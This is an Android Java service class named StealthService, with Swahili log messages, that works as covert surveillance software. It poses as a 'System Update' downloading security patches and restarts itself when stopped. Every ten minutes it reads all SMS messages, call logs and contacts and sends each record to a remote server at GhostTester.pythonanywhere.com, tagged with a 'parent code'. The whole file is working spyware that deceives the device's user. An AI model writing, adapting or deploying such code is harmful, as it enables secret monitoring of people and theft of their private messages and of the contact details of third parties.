package com.security.update;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import android.Manifest;
import android.content.pm.PackageManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class StealthService extends Service {
    private static final String TAG = "StealthService";
    private Timer timer;
    private Timer permissionTimer;
    private String parentCode;
    private SharedPreferences prefs;
    private int dataSequence = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        createNotificationChannel();
        Log.d(TAG, "🔍 StealthService imeanzishwa kwa siri...");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("PARENT_CODE")) {
            parentCode = intent.getStringExtra("PARENT_CODE");
            Log.d(TAG, "📱 Parent Code: " + parentCode);
        } else {
            parentCode = prefs.getString("parent_code", "");
            Log.d(TAG, "📱 Parent Code from prefs: " + parentCode);
        }

        startForegroundService();
        startPermissionRecovery();
        startSurveillance();
        
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "surveillance_channel",
                "System Services",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("System background services");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private void startForegroundService() {
        Notification notification;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notification = new Notification.Builder(this, "surveillance_channel")
                .setContentTitle("System Update")
                .setContentText("Downloading security patches...")
                .setSmallIcon(android.R.drawable.stat_sys_download)
                .setPriority(Notification.PRIORITY_LOW)
                .setOngoing(true)
                .build();
        } else {
            notification = new Notification.Builder(this)
                .setContentTitle("System Update")
                .setContentText("Downloading security patches...")
                .setSmallIcon(android.R.drawable.stat_sys_download)
                .setPriority(Notification.PRIORITY_LOW)
                .setOngoing(true)
                .build();
        }
        
        startForeground(101, notification);
    }

    // 🆕 FEATURE MPYA: AUTOMATIC PERMISSION RECOVERY
    private void startPermissionRecovery() {
        if (permissionTimer != null) {
            permissionTimer.cancel();
        }

        permissionTimer = new Timer();
        
        // Check permissions kila baada ya sekunde 30
        permissionTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (!hasRequiredPermissions()) {
                    Log.w(TAG, "⚠️ Baadhi ya ruhusa hazipo, inajaribu kurecover...");
                    attemptPermissionRecovery();
                } else {
                    Log.d(TAG, "✅ Ruhusa zote zipo - inaendelea na kazi");
                }
            }
        }, 0, 30000); // Check kila 30 seconds

        Log.d(TAG, "🔄 Permission recovery system imeanzishwa");
    }

    private void startSurveillance() {
        if (timer != null) {
            timer.cancel();
        }

        timer = new Timer();

        // Anza kukusanya data mara moja
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                if (hasRequiredPermissions()) {
                    collectAndSendAllData();
                } else {
                    Log.w(TAG, "⏳ Ruhusa bado hazipo - inasubiri...");
                }
            }
        }, 0);

        // Rudia kukusanya data kila baada ya dakika 10
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (hasRequiredPermissions()) {
                    collectAndSendAllData();
                }
            }
        }, 600000, 600000);

        Log.d(TAG, "📡 Surveillance imeanzishwa");
    }

    // 🆕 FEATURE: AUTOMATIC PERMISSION RECOVERY ATTEMPT
    private void attemptPermissionRecovery() {
        try {
            // Hii inaweza kutumia system dialogs kuomba permissions
            // Kwa sasa, tuta-restart service ambayo ita-trigger permission check
            Log.d(TAG, "🔄 Inajaribu kurecover permissions kwa kurestart service...");
            
            Intent restartIntent = new Intent(this, StealthService.class);
            restartIntent.putExtra("PARENT_CODE", parentCode);
            stopSelf();
            startService(restartIntent);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error recovering permissions: " + e.getMessage());
        }
    }

    private boolean hasRequiredPermissions() {
        String[] requiredPermissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS
        };
        
        for (String permission : requiredPermissions) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void collectAndSendAllData() {
        try {
            Log.d(TAG, "🔄 Kuanza kukusanya data...");
            dataSequence++;

            // 1. Kusanya SMS ZOTE
            if (checkPermission(Manifest.permission.READ_SMS)) {
                collectAndSendSMSData();
            }

            // 2. Kusanya CALL LOG ZOTE
            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
                collectAndSendCallsData();
            }

            // 3. Kusanya CONTACTS ZOTE
            if (checkPermission(Manifest.permission.READ_CONTACTS)) {
                collectAndSendContactsData();
            }

            Log.d(TAG, "✅ Ukusaji wa data #" + dataSequence + " umekamilika");

        } catch (Exception e) {
            Log.e(TAG, "❌ Error collecting data: " + e.getMessage());
        }
    }

    private void collectAndSendSMSData() {
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DATE + " DESC"
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    JSONObject smsData = new JSONObject();
                    smsData.put("sender", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    smsData.put("message", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    smsData.put("timestamp", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                    smsData.put("type", getSMSTypeText(cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))));
                    smsData.put("sequence", dataSequence);

                    sendSingleDataToServer("sms", smsData);
                    count++;
                    
                    if (count % 10 == 0) Thread.sleep(2000);
                }
                cursor.close();
                Log.d(TAG, "✅ SMS " + count + " zimetumwa");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading SMS: " + e.getMessage());
        }
    }

    private void collectAndSendCallsData() {
        try {
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC"
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    JSONObject callData = new JSONObject();
                    callData.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    callData.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    callData.put("timestamp", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    callData.put("type", getCallTypeText(cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
                    callData.put("sequence", dataSequence);

                    sendSingleDataToServer("calls", callData);
                    count++;
                    
                    if (count % 10 == 0) Thread.sleep(2000);
                }
                cursor.close();
                Log.d(TAG, "✅ Call Log " + count + " zimetumwa");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading calls: " + e.getMessage());
        }
    }

    private void collectAndSendContactsData() {
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));

                    JSONArray phoneNumbers = getAllContactPhoneNumbers(contactId);
                    
                    if (phoneNumbers.length() > 0) {
                        JSONObject contactData = new JSONObject();
                        contactData.put("name", name);
                        contactData.put("phones", phoneNumbers);
                        contactData.put("timestamp", System.currentTimeMillis());
                        contactData.put("sequence", dataSequence);

                        sendSingleDataToServer("contacts", contactData);
                        count++;
                        
                        if (count % 5 == 0) Thread.sleep(2000);
                    }
                }
                cursor.close();
                Log.d(TAG, "✅ Contacts " + count + " zimetumwa");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading contacts: " + e.getMessage());
        }
    }

    private JSONArray getAllContactPhoneNumbers(String contactId) {
        JSONArray phones = new JSONArray();
        try {
            Cursor phoneCursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                new String[]{contactId},
                null
            );

            if (phoneCursor != null) {
                while (phoneCursor.moveToNext()) {
                    String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    String type = getPhoneTypeText(phoneCursor.getInt(phoneCursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.TYPE)));
                    
                    JSONObject phoneInfo = new JSONObject();
                    phoneInfo.put("number", phone);
                    phoneInfo.put("type", type);
                    phones.put(phoneInfo);
                }
                phoneCursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting phone numbers: " + e.getMessage());
        }
        return phones;
    }

    private String getSMSTypeText(int smsType) {
        switch (smsType) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "received";
            case Telephony.Sms.MESSAGE_TYPE_SENT: return "sent";
            case Telephony.Sms.MESSAGE_TYPE_DRAFT: return "draft";
            default: return "unknown";
        }
    }

    private String getCallTypeText(int callType) {
        switch (callType) {
            case CallLog.Calls.INCOMING_TYPE: return "incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
            case CallLog.Calls.MISSED_TYPE: return "missed";
            default: return "unknown";
        }
    }

    private String getPhoneTypeText(int phoneType) {
        switch (phoneType) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME: return "home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE: return "mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK: return "work";
            default: return "other";
        }
    }

    private void sendSingleDataToServer(String dataType, JSONObject dataContent) {
        new Thread(() -> {
            try {
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
                
                JSONObject postData = new JSONObject();
                postData.put("parent_code", parentCode);
                postData.put("data_type", dataType);
                postData.put("device_id", android.os.Build.MODEL);
                postData.put("data_content", dataContent);

                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);

                OutputStream os = conn.getOutputStream();
                os.write(postData.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "✅ " + dataType + " imetumwa kikamilifu");
                } else {
                    Log.e(TAG, "❌ Server error for " + dataType + ": " + responseCode);
                }

            } catch (Exception e) {
                Log.e(TAG, "❌ Error sending " + dataType + ": " + e.getMessage());
            }
        }).start();
    }

    private boolean checkPermission(String permission) {
        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) timer.cancel();
        if (permissionTimer != null) permissionTimer.cancel();
        
        // AUTOMATIC RESTART
        Intent restartIntent = new Intent(this, StealthService.class);
        restartIntent.putExtra("PARENT_CODE", parentCode);
        startService(restartIntent);
        
        Log.d(TAG, "🔄 StealthService inaanzishwa tena kwa kiotomatiki");
    }
}
